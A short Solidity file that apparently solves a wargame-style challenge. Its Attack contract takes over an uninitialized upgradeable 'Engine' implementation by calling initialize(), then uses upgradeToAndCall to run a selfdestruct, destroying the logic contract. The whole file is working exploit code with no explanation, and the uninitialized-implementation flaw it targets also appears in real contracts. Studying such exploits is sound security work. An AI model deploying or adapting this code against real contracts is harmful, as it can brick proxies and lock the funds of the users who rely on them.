// SPDX-License-Identifier: MIT

pragma solidity  ^0.8.0;

interface IEngine {
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
}

contract Attack {
    IEngine target;

    constructor(address targetAddr) {
        target = IEngine(targetAddr);
    }

    function attack() public {
        target.initialize();
        target.upgradeToAndCall(address(this), abi.encodeWithSelector(this.kill.selector));
    }

    function kill() public {
        selfdestruct(payable(msg.sender));
    }
}
